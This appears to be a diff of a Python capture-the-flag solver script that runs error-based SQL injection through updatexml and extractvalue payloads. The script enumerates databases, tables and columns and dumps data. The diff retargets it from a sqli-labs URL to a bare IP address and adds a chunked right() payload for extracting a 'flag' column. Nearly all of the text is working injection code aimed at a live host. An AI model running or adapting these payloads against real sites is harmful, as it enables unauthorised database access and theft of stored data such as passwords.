@@ -7,13 +7,14 @@ start_time = time.time()
 session = HTMLSession()
 proxies = {}
 
-url = 'http://257-10e7a19d-ccea-49c7.nss.ctfer.vip:9080/Less-5/?id=1'
+url = 'http://1.14.71.254:28056/index.php?id=1'
 
 payload_xml            = """' or updatexml(1,concat(0x7e,({})),1)%23"""
 payload_xml_database   = payload_xml.format('database()')
 payload_xml_table      = payload_xml.format('select group_concat(table_name) from information_schema.tables where table_schema=database()')
 payload_xml_column     = payload_xml.format('select group_concat(column_name) from information_schema.columns where table_name="{}"')
 payload_xml_data       = payload_xml.format('select group_concat({}) from {}')
+payload_xml_data_right = payload_xml.format('select group_concat(right({},25)) from {}')
 
 
 payload_ex            = """' and extractvalue(1,concat(0x7e,({}),0x7e))%23"""
@@ -37,13 +38,14 @@ def go(title, payload):
 
 
 if __name__ == '__main__':
-    table_name = 'users'
-    column_name = 'password'
+    table_name = 'test_tb'
+    column_name = 'flag'
     #
     # go('db', payload_xml_database)
     # go('table', payload_xml_table)
     # go('column', payload_xml_column.format(table_name))
     # go('data', payload_xml_data.format(column_name, table_name))
+    go('data', payload_xml_data_right.format(column_name, table_name))
     #
     #
     # go('db', payload_ex_database)
@@ -52,7 +54,7 @@ if __name__ == '__main__':
     # go('data', payload_ex_data.format(column_name, table_name))
     #
 
-    go('db', payload_floor_database)
+    # go('db', payload_floor_database)
     # go('table', payload_floor_table)
     # go('column', payload_floor_column.format(table_name))
     # go('data', payload_floor_data.format(column_name, table_name))
